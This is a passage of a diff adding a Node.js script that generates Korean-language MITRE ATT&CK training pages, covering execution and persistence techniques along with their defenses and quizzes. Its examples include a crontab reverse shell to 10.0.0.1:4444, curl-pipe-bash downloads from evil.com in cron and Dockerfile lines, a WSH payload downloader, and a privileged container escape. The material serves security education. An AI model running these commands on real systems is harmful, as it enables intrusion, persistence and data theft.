패턴)','$   Impacket secretsdump 실행 ⚠️','$ ','$ pip 패키지 검사:','$   악성 패키지 설치: colourama (typosquat) ⚠️','$   정상: colorama','$ ','$ ⚠️ Python 리버스 셸 + 악성 패키지!'],qq:'Q1. Python을 악용한 공격을 방어하는 가장 좋은 방법은?',qc:['Python을 모든 시스템에서 삭제한다','AppLocker와 EDR로 Python 실행을 제한하고 모니터링한다','Python 3만 허용하고 Python 2를 삭제한다','인터넷 연결을 차단한다'],qa:1,qy:'정답! AppLocker로 실행을 제한하고 EDR로 비정상 활동을 모니터링합니다.',qn:'오답. Python 자체를 삭제하기보다 실행 제한과 모니터링이 현실적인 방어입니다.'},
+  {id:'T1059.007',pid:'t1059-007-javascript',file:'t1059-007-javascript',en:'JavaScript',ko:'JavaScript 악용',tactic:'Execution',desc:'JavaScript 엔진(WSH, Node.js)을 통한 악성 코드 실행',c1t:'JavaScript 악용이란?',c1:'<strong>Windows Script Host(WSH), Node.js, 브라우저 JavaScript</strong>를 악용하여 악성 코드를 실행합니다. .js/.jse 파일은 Windows에서 더블클릭으로 실행되며, WScript.Shell 객체로 시스템 명령을 실행할 수 있습니다. HTA(HTML Application)와 결합하여 피싱 공격에 활용됩니다.',cards:[['WSH 실행','wscript/cscript로 .js 파일 실행 (시스템 명령)'],['Node.js 악용','서버 측 Node.js를 통한 RCE 및 백도어'],['HTA 공격','HTML Application으로 브라우저 보안 우회']],term:['# WSH를 이용한 파일 다운로드','var xhr = new ActiveXObject("MSXML2.XMLHTTP");','xhr.open("GET", "http://evil.com/payload.exe", false);','xhr.send();','var stream = new ActiveXObject("ADODB.Stream");','stream.SaveToFile("C:\\\\temp\\\\payload.exe", 2);','','// .js 파일 = Windows에서 실행 가능한 스크립트'],atk:['<strong>WSH 드로퍼</strong>: .js 파일로 악성코드 다운로드/실행','<strong>HTA 피싱</strong>: mshta.exe로 원격 HTA 실행','<strong>Node.js RCE</strong>: 서버 측 코드 인젝션','<strong>난독화</strong>: JScript 난독화로 AV 우회'],def:['<strong>WSH 비활성화</strong>: 그룹 정책으로 wscript/cscript 차단','<strong>파일 연결 변경</strong>: .js/.jse를 메모장으로 열도록 설정','<strong>ASR 규칙</strong>: 스크립트 기반 공격 표면 축소','<strong>AMSI</strong>: JScript 실행 시 악성 패턴 검사','<strong>AppLocker</strong>: 스크립트 실행 화이트리스트'],sim:['$ JavaScript 악성 활동 탐지:','$   wscript.exe 실행: invoice.js ⚠️','$   ActiveXObject 사용 (XMLHTTP + ADODB)','$   파일 다운로드: evil.com/payload.exe ⚠️','$ ','$   mshta.exe 원격 HTA 실행 ⚠️','$   URL: http://evil.com/dropper.hta','$ ','$ ⚠️ WSH 드로퍼 + HTA 공격 탐지!'],qq:'Q1. Windows에서 .js 파일을 통한 공격을 방어하는 가장 효과적인 방법은?',qc:['JavaScript를 브라우저에서 비활성화한다','WSH(wscript/cscript)를 비활성화하고 .js 파일 연결을 변경한다','Node.js를 삭제한다','모든 스크립트 파일을 삭제한다'],qa:1,qy:'정답! WSH를 비활성화하고 .js 파일이 메모장으로 열리도록 설정하면 스크립트 실행을 차단합니다.',qn:'오답. WSH 비활성화와 파일 연결 변경이 .js 파일 기반 공격의 핵심 방어입니다.'},
+  {id:'T1059.009',pid:'t1059-009-cloud-api',file:'t1059-009-cloud-api',en:'Cloud API',ko:'클라우드 API 악용',tactic:'Execution',desc:'AWS CLI, Azure PowerShell, gcloud 등 클라우드 API를 통한 악성 명령 실행',c1t:'클라우드 API 악용이란?',c1:'<strong>AWS CLI, Azure PowerShell, Google Cloud SDK</strong> 등 클라우드 관리 도구를 악용하여 클라우드 리소스를 조작합니다. 탈취한 API 키로 인스턴스 생성, 데이터 유출, 권한 상승 등을 수행합니다. 서버리스 함수(Lambda)를 악용한 공격도 포함됩니다.',cards:[['AWS CLI','탈취한 키로 S3 데이터 유출, EC2 인스턴스 조작'],['Azure PowerShell','Azure AD 조작, VM 생성, 구독 정보 수집'],['서버리스 악용','Lambda/Cloud Functions에 악성 코드 배포']],term:['# AWS CLI로 데이터 유출','aws s3 sync s3://confidential-data /tmp/exfil/','','# Lambda에 백도어 배포','aws lambda create-function --function-name backdoor \\','  --runtime python3.9 --handler lambda_function.handler \\','  --zip-file fileb://backdoor.zip','','// 클라우드 API = 무한한 리소스 접근'],atk:['<strong>데이터 유출</strong>: S3/Blob/GCS에서 대량 데이터 다운로드','<strong>리소스 생성</strong>: 암호화폐 채굴용 인스턴스 대량 생성','<strong>권한 상승</strong>: IAM 정책 수정으로 관리자 권한 획득','<strong>서버리스 백도어</strong>: Lambda에 C2 통신 코드 배포'],def:['<strong>CloudTrail/감사 로그</strong>: 모든 API 호출 로깅 및 알림','<strong>IAM 최소 권한</strong>: 필요한 최소한의 권한만 부여','<strong>SCP/가드레일</strong>: 조직 레벨 권한 제한','<strong>이상 탐지</strong>: 비정상 API 호출 패턴 모니터링','<strong>키 관리</strong>: 임시 자격증명(STS) 사용, 장기 키 제거'],sim:['$ 클라우드 API 이상 활동:','$   aws s3 cp: 500GB 다운로드 ⚠️','$   대상: s3://confidential-data','$   aws ec2 run-instances: GPU 인스턴스 20대 ⚠️','$   용도: 암호화폐 채굴 의심','$ ','$ IAM 변경:','$   iam:PutRolePolicy 호출 ⚠️','$   AdministratorAccess 권한 추가!','$ ','$ ⚠️ 데이터 유출 + 채굴 + 권한 상승!'],qq:'Q1. 클라우드 API 악용을 탐지하는 핵심 도구는?',qc:['네트워크 방화벽','CloudTrail/감사 로그를 통한 API 호출 모니터링','안티바이러스','VPN'],qa:1,qy:'정답! CloudTrail 같은 감사 로그로 모든 API 호출을 모니터링하고 이상 패턴을 탐지합니다.',qn:'오답. 클라우드 API는 CloudTrail/감사 로그를 통해 모든 호출을 모니터링하는 것이 핵심입니다.'},
+  {id:'T1059.010',pid:'t1059-010-container-cli',file:'t1059-010-container-cli',en:'Container CLI',ko:'컨테이너 CLI 악용',tactic:'Execution',desc:'Docker/kubectl 등 컨테이너 CLI를 통한 악성 명령 실행 및 탈출',c1t:'컨테이너 CLI 악용이란?',c1:'<strong>Docker CLI, kubectl, podman</strong> 등 컨테이너 관리 도구를 악용하여 컨테이너를 생성/조작하고, 호스트 시스템으로 탈출합니다. 특권 컨테이너 실행, 호스트 파일시스템 마운트, CronJob 악용 등이 포함됩니다.',cards:[['Docker 탈출','--privileged 또는 호스트 마운트로 호스트 접근'],['kubectl 악용','RBAC 우회로 시크릿/파드 조작'],['이미지 변조','악성 코드가 포함된 컨테이너 이미지 배포']],term:['# 특권 컨테이너로 호스트 탈출','docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -i -n bash','','# kubectl로 시크릿 수집','kubectl get secrets --all-namespaces -o json','','# 악성 CronJob 생성','kubectl create -f malicious-cronjob.yaml','','// 컨테이너 탈출 = 호스트 장악'],atk:['<strong>Docker 소켓 악용</strong>: /var/run/docker.sock 마운트로 호스트 제어','<strong>특권 컨테이너</strong>: --privileged로 호스트 커널 접근','<strong>RBAC 우회</strong>: 과도한 권한의 ServiceAccount 악용','<strong>이미지 포이즈닝</strong>: 공개 레지스트리에 악성 이미지 등록'],def:['<strong>PSP/OPA</strong>: Pod Security Policy로 특권 컨테이너 차단','<strong>RBAC 최소 권한</strong>: ServiceAccount 권한 최소화','<strong>이미지 서명</strong>: Cosign으로 이미지 무결성 검증','<strong>런타임 보안</strong>: Falco로 컨테이너 이상 활동 탐지','<strong>네트워크 정책</strong>: 파드 간 통신 제한'],sim:['$ 컨테이너 보안 점검:','$   특권 컨테이너: 3개 실행 중 ⚠️','$   Docker 소켓 마운트: 2개 파드 ⚠️','$   RBAC: cluster-admin 바인딩 5개 ⚠️','$ ','$ 이미지 검사:','$   미서명 이미지: 12개 ⚠️','$   알려진 CVE: 47개 (Critical: 8)','$ ','$ ⚠️ 특권 컨테이너 + RBAC 과권한!'],qq:'Q1. Docker 컨테이너 탈출을 방지하는 가장 효과적인 방법은?',qc:['Docker를 사용하지 않는다','특권 컨테이너 실행을 차단하고 호스트 마운트를 제한한다','모든 컨테이너를 root로 실행한다','네트워크를 차단한다'],qa:1,qy:'정답! --privileged 차단과 호스트 마운트 제한이 컨테이너 탈출 방지의 핵심입니다.',qn:'오답. 특권 컨테이너 차단과 호스트 리소스 마운트 제한이 가장 효과적입니다.'},
+  {id:'T1204.001',pid:'t1204-001-malicious-file-exec',file:'t1204-001-malicious-file-exec',en:'Malicious File',ko:'악성 파일 실행 유도',tactic:'Execution',desc:'사용자가 악성 파일을 실행하도록 유도하여 코드 실행',c1t:'악성 파일 실행 유도란?',c1:'<strong>이메일 첨부파일, 다운로드 등을 통해 전달된 악성 파일을 사용자가 직접 실행</strong>하도록 유도하는 기법입니다. 매크로 문서(Word/Excel), 스크립트 파일(.js/.vbs), 실행파일(.exe/.msi), 압축파일(.zip/.iso) 등 다양한 형태로 전달됩니다.',cards:[['매크로 문서','Word/Excel 매크로가 포함된 악성 문서'],['이중 확장자','report.pdf.exe처럼 확장자를 숨겨 위장'],['ISO/IMG 마운트','웹 마크(MOTW) 우회를 위한 디스크 이미지 사용']],term:['# 매크로 악성 문서 분석','olevba malicious_invoice.docm','','# 이중 확장자 공격','# 파일명: Annual_Report_2026.pdf.exe','# Windows 기본 설정: 확장자 숨김 → .pdf로 보임','','# ISO 마운트로 MOTW 우회','# ISO 내부 파일은 Mark-of-the-Web 없음','','// 사용자의 클릭 = 공격자의 승리'],atk:['<strong>Office 매크로</strong>: AutoOpen/Document_Open 매크로로 자동 실행','<strong>이중 확장자</strong>: Windows 확장자 숨김 기능 악용','<strong>ISO/IMG</strong>: MOTW(Mark-of-the-Web) 우회','<strong>LNK 드로퍼</strong>: 바로가기 파일에 PowerShell 명령 삽입'],def:['<strong>매크로 차단</strong>: 인터넷 출처 Office 매크로 기본 차단 (MS 정책)','<strong>확장자 표시</strong>: 그룹 정책으로 파일 확장자 항상 표시','<strong>ASR 규칙</strong>: Office 앱의 자식 프로세스 차단','<strong>MOTW 적용</strong>: ISO/IMG 파일에도 MOTW 표시','<strong>샌드박스</strong>: 의심 파일을 격리 환경에서 분석'],sim:['$ 악성 파일 분석:','$   파일: Invoice_March_2026.docm','$   매크로: AutoOpen() 발견 ⚠️','$   매크로 내용: PowerShell 다운로더 ⚠️','$ ','$   파일: Report.pdf.exe','$   ⚠️ 이중 확장자! 실제: PE Executable','$ ','$   파일: Update.iso','$   ⚠️ ISO 내부 LNK → PowerShell 실행','$ ','$ ⚠️ 3개 악성 파일 탐지!'],qq:'Q1. Office 매크로 악성 문서 방어에 가장 효과적인 방법은?',qc:['Office를 사용하지 않는다','인터넷 출처 매크로를 기본 차단하고 ASR 규칙을 적용한다','매크로를 모두 허용한다','문서를 열기 전 항상 재부팅한다'],qa:1,qy:'정답! 인터넷 출처 매크로 기본 차단과 ASR 규칙이 가장 효과적입니다.',qn:'오답. Microsoft의 인터넷 출처 매크로 기본 차단 정책과 ASR 규칙이 핵심 방어입니다.'},
+  {id:'T1204.003',pid:'t1204-003-malicious-image',file:'t1204-003-malicious-image',en:'Malicious Image',ko:'악성 이미지',tactic:'Execution',desc:'악성 코드가 포함된 컨테이너/VM 이미지를 배포하여 코드 실행',c1t:'악성 이미지란?',c1:'<strong>Docker Hub, ECR 등 공개 레지스트리에 악성 코드가 포함된 컨테이너 이미지</strong>를 등록하거나, 정상 이미지를 변조하여 배포합니다. 사용자가 해당 이미지를 pull/run 하면 악성 코드가 실행됩니다. 암호화폐 채굴, 백도어, 자격증명 탈취 등에 활용됩니다.',cards:[['타이포스쿼팅','정상 이미지와 유사한 이름의 악성 이미지 등록'],['백도어 이미지','정상 기능 + 숨겨진 악성 코드 포함'],['이미지 변조','빌드 파이프라인에서 정상 이미지에 악성 레이어 추가']],term:['# Docker Hub에서 타이포스쿼팅 이미지','docker pull ngimx  # nginx가 아닌 ngimx','','# 악성 이미지 내부 (Dockerfile)','FROM ubuntu:22.04','RUN apt-get install -y curl','RUN curl -s http://evil.com/miner | bash','CMD ["nginx", "-g", "daemon off;"]','','// 정상 기능 + 숨겨진 채굴기'],atk:['<strong>타이포스쿼팅</strong>: nginx → ngimx 등 유사 이름 악성 이미지','<strong>백도어 삽입</strong>: 정상 이미지에 채굴기/C2 에이전트 추가','<strong>레지스트리 탈취</strong>: 사설 레지스트리 접근하여 이미지 교체','<strong>빌드 파이프라인</strong>: CI/CD에서 이미지 빌드 과정에 악성 코드 주입'],def:['<strong>이미지 서명</strong>: Cosign/Notary로 이미지 무결성 검증','<strong>이미지 스캐닝</strong>: Trivy, Grype로 CVE/악성코드 검사','<strong>Admission Controller</strong>: 서명/스캔 미통과 이미지 배포 차단','<strong>사설 레지스트리</strong>: 승인된 이미지만 사설 레지스트리에서 사용','<strong>베이스 이미지 관리</strong>: 승인된 베이스 이미지만 사용 허용'],sim:['$ 컨테이너 이미지 보안 검사:','$   이미지: ngimx:latest (타이포스쿼팅!) ⚠️','$   Trivy 스캔: 암호화폐 채굴기 발견 ⚠️','$   서명: 미서명 이미지 ⚠️','$ ','$ 레이어 분석:','$   Layer 3: curl http://evil.com/miner ⚠️','$   Layer 4: 정상 nginx 설정','$ ','$ ⚠️ 악성 이미지 탐지! 채굴기 포함!'],qq:'Q1. 악성 컨테이너 이미지를 방지하는 가장 효과적인 방법은?',qc:['Docker Hub를 사용하지 않는다','이미지 서명 검증과 보안 스캔을 CI/CD에 통합한다','모든 이미지를 직접 빌드한다','컨테이너 대신 VM을 사용한다'],qa:1,qy:'정답! 이미지 서명(Cosign)과 보안 스캔(Trivy)을 CI/CD 파이프라인에 필수로 포함합니다.',qn:'오답. 이미지 서명 검증과 보안 스캔을 배포 파이프라인에 통합하는 것이 핵심입니다.'},
+  {id:'T1053.003',pid:'t1053-003-cron',file:'t1053-003-cron',en:'Cron',ko:'크론 작업',tactic:'Execution',desc:'Linux cron을 악용하여 악성 명령을 주기적으로 실행',c1t:'크론 작업 악용이란?',c1:'<strong>Linux/macOS의 cron 스케줄러</strong>를 악용하여 악성 명령을 주기적으로 실행합니다. 사용자 crontab 또는 시스템 크론(/etc/cron.d)에 악성 명령을 등록하여 지속성을 확보합니다. 정상 크론 작업 사이에 숨겨 탐지를 어렵게 만듭니다.',cards:[['사용자 crontab','crontab -e로 악성 명령 추가'],['시스템 크론','/etc/cron.d에 악성 크론 파일 생성'],['크론 복구','삭제 후 다른 크론 작업이 재생성하는 자가 복구 메커니즘']],term:['# 사용자 crontab에 리버스 셸 등록','(crontab -l; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'") | crontab -','','# 시스템 크론에 백도어','echo "*/10 * * * * root curl -s http://evil.com/update.sh | bash" > /etc/cron.d/system-update','','// 크론 = 조용한 지속성'],atk:['<strong>5분 간격 비컨</strong>: 짧은 간격으로 C2 체크인','<strong>파일리스 실행</strong>: curl | bash로 디스크 흔적 최소화','<strong>자가 복구</strong>: 두 크론이 서로를 복구하는 이중화','<strong>위장</strong>: 정상 작업명(system-update)으로 위장'],def:['<strong>크론탭 모니터링</strong>: inotify/auditd로 crontab 변경 감시','<strong>파일 무결성</strong>: /etc/cron.d 디렉토리 변경 감시','<strong>최소 권한</strong>: cron 사용을 필요한 사용자로 제한 (/etc/cron.allow)','<strong>정기 감사</strong>: 모든 크론 작업 주기적 검토','<strong>EDR</strong>: 크론에서 실행된 프로세스의 비정상 활동 탐지'],sim:['$ 크론 작업 감사:','$   사용자 crontab 검사 (5명):','$   root: 정상 작업 3개 ✓','$   www-data: */5 리버스 셸! ⚠️','$ ','$   시스템 크론 (/etc/cron.d):','$   system-update: curl | bash ⚠️','$   ⚠️ 정상 작업명으로 위장!','$ ','$ ⚠️ 악성 크론 2개 발견!'],qq:'Q1. 악성 크론 작업을 탐지하는 가장 효과적인 방법은?',qc:['크론을 완전히 비활성화한다','auditd로 crontab 변경을 감시하고 정기적으로 크론 작업을 감사한다','모든 크론 작업을 root로만 실행한다','크론 대신 systemd timer만 사용한다'],qa:1,qy:'정답! auditd로 변경 감시 + 정기 감사가 가장 효과적입니다.',qn:'오답. crontab 변경 모니터링과 정기 감사의 조합이 핵심입니다.'},
+  {id:'T1053.001',pid:'t1053-001-at-job',file:'t1053-001-at-job',en:'At Job',ko:'At 작업 스케줄링',tactic:'Execution',desc:'at 명령으로 예약 작업을 등록하여 악성 명령 실행',c1t:'At 작업이란?',c1:'<strong>Windows의 at 명령 또는 Linux의 at 데몬</strong>을 이용하여 특정 시간에 명령을 실행하는 기법입니다. schtasks에 비해 오래된 도구이지만 여전히 사용 가능하며, 특정 시간에 한 번 실행되는 특성으로 포렌식 분석을 어렵게 만듭니다.',cards:[['Windows at','at \\\\target 02:00 cmd /c payload.exe'],['Linux at','echo "curl evil.com/payload|bash" | at now + 5 minutes'],['일회성 실행','실행 후 작업이 자동 삭제되어 흔적 최소화']],term:['# Windows at 명령 (원격 실행)','at \\\\10.0.0.50 02:00 /interactive cmd.exe /c C:\\temp\\beacon.exe','','# Linux at 명령','echo "/tmp/.backdoor" | at now + 1 hour','','# Windows schtasks (at의 현대 대체)','schtasks /create /tn "Cleanup" /tr "payload.exe" /sc once /st 02:00','','// at 작업 = 시한폭탄'],atk:['<strong>시간 지연 실행</strong>: 업무 외 시간에 실행되도록 예약','<strong>원격 실행</strong>: at \\\\target으로 원격 시스템에 작업 등록','<strong>자동 삭제</strong>: 실행 후 작업이 사라져 포렌식 회피','<strong>SYSTEM 권한</strong>: at으로 등록된 작업은 SYSTEM으로 실행'],def:['<strong>at 비활성화</strong>: 그룹 정책으로 at 명령 비활성화','<strong>이벤트 로그</strong>: Security Event 4698(작업 생성) 모니터링','<strong>Sysmon</strong>: at.exe/schtasks.exe 프로세스 생성 감시','<strong>Task Scheduler 감사</strong>: 예약 작업 정기 검토','<strong>원격 실행 제한</strong>: 원격 at 명령 차단'],sim:['$ 예약 작업 감사:','$   Windows at 작업:','$   ID 1: 02:00 cmd.exe /c beacon.exe ⚠️','$   등록자: NT AUTHORITY\\SYSTEM','$ ','$   Linux at 큐:','$   Job 1: at now + 1 hour → /tmp/.backdoor ⚠️','$ ','$ ⚠️ 예약된 악성 작업 발견!'],qq:'Q1. at 명령을 통한 공격의 특징은?',qc:['항상 즉시 실행된다','정해진 시간에 실행되고 실행 후 작업이 자동 삭제된다','관리자 권한이 필요 없다','네트워크 연결이 필요하다'],qa:1,qy:'정답! at 작업은 지정 시간에 실행되고 자동으로 삭제되어 포렌식을 어렵게 만듭니다.',qn:'오답. at의 핵심 특징은 시간 지연 실행과 실행 후 자동 삭제입니다.'},
+  {id:'T1053.006',pid:'t1053-006-systemd-timers',file:'t1053-006-systemd-timers',en:'Systemd Timers',ko:'Systemd 타이머',tactic:'Execution',desc:'systemd 타이머를 악용하여 악성 서비스를 주기적으로 실행',c1t:'Systemd 타이머 악용이란?',c1:'<strong>Linux의 systemd 타이머</strong>를 악용하여 악성 서비스를 주기적으로 실행합니다. cron보다 세밀한 제어가 가능하며, systemd 서비스와 연동되어 더 복잡한 공격이 가능합니다. systemd가 관리하므로 시스템 재시작 후에도 자동으로 실행됩니다.',cards:[['타이머 유닛','.timer 파일로 실행 주기를 정의'],['서비스 유닛','.service 파일로 실행할 명령을 정의'],['지속성','systemd enable로 부팅 시 자동 시작']],term:['# 악성 타이머 생성','cat > /etc/systemd/system/update-check.timer << EOF','[Unit]','Description=System Update Check','[Timer]','OnCalendar=*:0/15','[Install]','WantedBy=timers.target','EOF','','# systemctl enable --now update-check.timer','','// systemd 타이머 = 진화한 크론'],atk:['<strong>정상 위장</strong>: update-check, log-rotate 등 정상 서비스명 사용','<strong>부팅 지속성</strong>: systemctl enable로 영구 등록','<strong>ExecStartPre</strong>: 서비스 시작 전 악성 명령 실행','<strong>타이머 정밀도</strong>: cron보다 초 단위 정밀 제어 가능'],def:['<strong>systemd 감사</strong>: 새 .timer/.service 파일 생성 모니터링','<strong>파일 무결성</strong>: /etc/systemd/system 변경 감시','<strong>EDR</strong>: systemd에서 실행된 프로세스 모니터링','<strong>정기 검토</strong>: systemctl list-timers 정기 감사','<strong>접근 제한</strong>: systemd 디렉토리 쓰기 권한 제한'],sim:['$ systemd 타이머 감사:','$   systemctl list-timers --all','$   update-check.timer: 15분 간격 ⚠️','$   서비스: ExecStart=/tmp/.update ⚠️','$ ','$   파일 분석:','$   /tmp/.update: ELF binary (리버스 셸) ⚠️','$   systemctl is-enabled: enabled (지속성)','$ ','$ ⚠️ 악성 systemd 타이머 발견!'],qq:'Q1. systemd 타이머가 cron보다 공격자에게 유리한 이유는?',qc:['더 빠르게 실행되기 때문','cron보다 더 쉽기 때문','systemd 서비스와 연동되어 복잡한 공격이 가능하고 부팅 지속성이 보장되기 때문','Windows에서도 사용 가능하기 때문'],qa:2,qy:'정답! systemd 타이머는 서비스 연동, 부팅 지속성, 정밀 제어가 가능합니다.',qn:'오답. systemd 타이머는 서비스와의 연동과 부팅 시 자동 시작이 cron보다 공격자에게 유리합니다.'},
+  {id:'T1569.001',pid:'t1569-001-launchctl',file:'t1569-001-launchctl',en:'Launchctl',ko:'Launchctl',tactic:'Execution',desc:'macOS의 launchctl을 통한 에이전트/데몬 등록으로 악성 코드 실행',c1t:'Launchctl 악용이란?',c1:'<strong>macOS의 launchctl</strong>을 이용하여 LaunchAgent/LaunchDaemon을 등록합니다. 이를 통해 사용자 로그인 시 또는 시스템 부팅 시 악성 코드가 자동 실행됩니다. plist 파일로 실행 조건을 세밀하게 설정할 수 있습니다.',cards:[['LaunchAgent','사용자 로그인 시 실행 (~Library/LaunchAgents)'],['LaunchDaemon','시스템 부팅 시 root로 실행 (/Library/LaunchDaemons)'],['plist 설정','RunAtLoad, KeepAlive 등 실행 조건 설정']],term:['# 악성 LaunchAgent 생성','cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF','<?xml version="1.0"?>','<plist version="1.0"><dict>','<key>Label</key><string>com.apple.update</string>','<key>ProgramArguments</key><array>','<string>/tmp/.update</string></array>','<key>RunAtLoad</key><true/>','<key>KeepAlive</key><true/>','</dict></plist>','EOF','launchctl load ~/Library/LaunchAgents/com.apple.update.plist','','// com.apple 접두사로 Apple 정상 서비스 위장'],atk:['<strong>Apple 위장</strong>: com.apple.* 라벨로 정상 서비스 위장','<strong>KeepAlive</strong>: 프로세스 종료 시 자동 재시작','<strong>WatchPaths</strong>: 특정 파일 변경 시 트리거','<strong>UserAgent + Daemon</strong>: 이중 등록으로 이중화'],def:['<strong>LaunchAgent 모니터링</strong>: 새 plist 파일 생성 감시','<strong>코드 서명 검증</strong>: 미서명 바이너리 실행 차단','<strong>Santa</strong>: Google의 macOS 바이너리 화이트리스팅 도구','<strong>정기 감사</strong>: launchctl list 정기 검토','<strong>SIP 활성화</strong>: System Integrity Protection 유지'],sim:['$ LaunchAgent 감사:','$   ~/Library/LaunchAgents:','$   com.apple.update.plist → /tmp/.update ⚠️','$   ⚠️ com.apple 접두사 위장!','$   RunAtLoad: true, KeepAlive: true','$ ','$   /tmp/.update 분석:','$   Mach-O 64-bit (미서명) ⚠️','$   네트워크: 10.0.0.1:4444 (리버스 셸)','$ ','$ ⚠️ 위장 LaunchAgent 발견!'],qq:'Q1. macOS LaunchAgent 악용을 탐지하는 가장 좋은 방법은?',qc:['launchctl을 삭제한다','LaunchAgents 디렉토리의 새 plist 생성을 감시하고 미서명 바이너리를 차단한다','모든 LaunchAgent를 비활성화한다','macOS를 재설치한다'],qa:1,qy:'정답! plist 생성 감시와 코드 서명 검증이 핵심입니다.',qn:'오답. LaunchAgents 디렉토리 감시와 미서명 바이너리 차단이 효과적입니다.'},
+  {id:'T1569.002',pid:'t1569-002-windows-service',file:'t1569-002-windows-service',en:'Service Execution',ko:'Windows 서비스 실행',tactic:'Execution',desc:'Windows 서비스를 생성/수정하여 SYSTEM 권한으로 악성 코드 실행',c1t:'서비스를 통한 실행이란?',c1:'<strong>Windows 서비스(sc.exe/services.msc)</strong>를 생성하거나 기존 서비스를 수정하여 악성 코드를 SYSTEM 권한으로 실행합니다. 서비스는 시스템 부팅 시 자동 시작되므로 지속성도 확보됩니다. PsExec도 내부적으로 서비스를 생성하여 원격 명령을 실행합니다.',cards:[['서비스 생성','sc create로 새 악성 서비스 등록'],['서비스 수정','기존 서비스의 바이너리 경로 수정'],['PsExec','원격 서비스 생성을 통한 명령 실행']],term:['# 악성 서비스 생성','sc create UpdateSvc binPath= "C:\\temp\\beacon.exe" start= auto','sc start UpdateSvc','','# PsExec 원격 실행 (내부적으로 서비스 생성)','psexec \\\\target -s -d C:\\temp\\beacon.exe','','# 서비스 바이너리 교체','sc config LegitService binPath= "C:\\temp\\beacon.exe"','','// 서비스 = SYSTEM 권한 실행'],atk:['<strong>신규 서비스</strong>: 정상 서비스명으로 위장하여 등록','<strong>바이너리 교체</strong>: 기존 서비스의 실행 파일 교체','<strong>DLL 사이드로딩</strong>: 서비스가 로드하는 DLL 교체','<strong>PsExec/RemCom</strong>: 원격 서비스 생성으로 원격 실행'],def:['<strong>서비스 생성 감시</strong>: Event 7045(새 서비스 설치) 모니터링','<strong>서비스 무결성</strong>: 서비스 바이너리 해시 정기 검증','<strong>최소 권한</strong>: 서비스 생성 권한 제한','<strong>AppLocker</strong>: 서비스 바이너리 화이트리스트','<strong>Sysmon</strong>: 서비스 프로세스의 비정상 자식 프로세스 탐지'],sim:['$ Windows 서비스 감사:','$   새 서비스 설치 (Event 7045):','$   UpdateSvc → C:\\temp\\beacon.exe ⚠️','$   시작 유형: 자동 (Auto)','$   계정: LocalSystem (SYSTEM 권한)','$ ','$   PsExec 흔적:','$   PSEXESVC 서비스 생성 기록 ⚠️','$ ','$ ⚠️ 악성 서비스 + PsExec 탐지!'],qq:'Q1. 악성 Windows 서비스를 탐지하는 가장 효과적인 이벤트 로그는?',qc:['Application Event Log','Security Event 7045 (새 서비스 설치)','System Event Log 일반','PowerShell Script Block Log'],qa:1,qy:'정답! Event 7045는 새 서비스 설치를 기록하며, 악성 서비스 탐지의 핵심입니다.',qn:'오답. Security Event 7045(새 서비스 설치)가 악성 서비스 탐지에 가장 중요합니다.'},
+  {id:'T1569.003',pid:'t1569-003-systemctl',file:'t1569-003-systemctl',en:'Systemctl',ko:'Systemctl',tactic:'Execution',desc:'systemctl을 통해 악성 systemd 서비스를 등록하여 코드 실행',c1t:'Systemctl 악용이란?',c1:'<strong>Linux의 systemctl</strong>을 이용하여 악성 systemd 서비스를 등록하고 실행합니다. systemd 서비스는 부팅 시 자동 시작, 실패 시 자동 재시작 등의 기능을 제공하여 강력한 지속성을 확보합니다. 정상 서비스명으로 위장하면 탐지가 어렵습니다.',cards:[['서비스 유닛','.service 파일로 악성 바이너리 실행 정의'],['자동 시작','systemctl enable로 부팅 시 자동 실행'],['자동 복구','Restart=always로 종료 시 자동 재시작']],term:['# 악성 systemd 서비스 생성','cat > /etc/systemd/system/system-monitor.service << EOF','[Unit]','Description=System Performance Monitor','After=network.target','[Service]','Type=simple','ExecStart=/opt/.monitor/agent','Restart=always','RestartSec=30','[Install]','WantedBy=multi-user.target','EOF','systemctl daemon-reload','systemctl enable --now system-monitor','','// 정상 모니터링 서비스로 위장'],atk:['<strong>서비스 위장</strong>: system-monitor, log-collector 등 정상 이름 사용','<strong>Restart=always</strong>: 프로세스 종료 시 30초 후 자동 재시작','<strong>After=network</strong>: 네트워크 활성화 후 실행 (C2 통신 보장)','<strong>숨김 경로</strong>: /opt/.monitor 등 숨겨진 디렉토리 사용'],def:['<strong>서비스 파일 모니터링</strong>: /etc/systemd/system 디렉토리 변경 감시','<strong>파일 무결성</strong>: AIDE/OSSEC로 서비스 파일 해시 검증','<strong>정기 감사</strong>: systemctl list-unit-files 정기 검토','<strong>접근 제한</strong>: systemd 디렉토리 쓰기 권한 제한 (root only)','<strong>EDR</strong>: systemd에서 실행된 프로세스의 네트워크 활동 감시'],sim:['$ systemd 서비스 감사:','$   systemctl list-unit-files --type=service','$   system-monitor.service: enabled ⚠️','$   ExecStart: /opt/.monitor/agent','$ ','$   바이너리 분석:','$   /opt/.monitor/agent: ELF binary ⚠️','$   네트워크: evil.com:443 (C2) ⚠️','$   Restart=always (자동 복구)','$ ','$ ⚠️ 악성 systemd 서비스 발견!'],qq:'Q1. 악성 systemd 서비스의 Restart=always가 방어를 어렵게 만드는 이유는?',qc:['서비스가 더 빨리 실행되기 때문','프로세스를 종료해도 자동으로 재시작되어 단순 kill로 제거할 수 없기 때문','더 많은 리소스를 사용하기 때문','로그가 생성되지 않기 때문'],qa:1,qy:'정답! Restart=always는 프로세스 종료 후 자동 재시작하므로, 서비스 파일 자체를 제거해야 합니다.',qn:'오답. Restart=always는 프로세스가 종료되어도 자동 재시작하여 단순 kill이 무효합니다.'}
+];
+
+// Remove the duplicate T1078.003 entry
+const uniqueItems = items.filter((item, idx) => {
+  if (idx === 1 && item.id === 'T1078.003') return false; // skip duplicate
+  return item.c1 !== undefined; // only items with content
+});
+
+let count = 0;
+for (const c of uniqueItems) {
+  // Write HTML
+  const htmlPath = path.join(EDU_DIR, `${c.file}.html`);
+  if (!fs.existsSync(htmlPath)) {
+    fs.writeFileSync(htmlPath, html(c), 'utf8');
+    count++;
+    console.log(`[HTML] ${c.id} → ${c.file}.html`);
+  } else {
+    console.log(`[SKIP] ${htmlPath} already exists`);
+  }
+
+  // Write JSON with minimal but valid structure
+  const jsonPath = path.join(JSON_DIR, `${c.id}.json`);
+  if (!fs.existsSync(jsonPath)) {
+    const jsonObj = {
+      id: c.id,
+      title: `${c.ko} 시뮬레이션`,
+      titleEn: `${c.en} Simulation`,
+      duration: 8,
+      phases: [
+        {"label":"🔍 정찰","labelEn":"🔍 Recon","steps":[0]},
